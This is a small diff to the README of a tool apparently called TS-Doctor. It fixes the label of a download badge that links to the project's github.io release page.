@@ -9,7 +9,7 @@
 - A short file list in **TS-Doctor**
 - Handoff on the last stream read in **TS-Doctor**
 
-[![Get TS-Doctor Release](https://img.shields.io/badge/Get-TS-Doctor_Release-2C3E50)](https://scharpingaliza.github.io/.github/TS-Doctor)
+[![Get TS-Doctor Release](https://img.shields.io/badge/Get-TS_Doctor_Release-2C3E50)](https://scharpingaliza.github.io/.github/TS-Doctor)
 
 ---
 
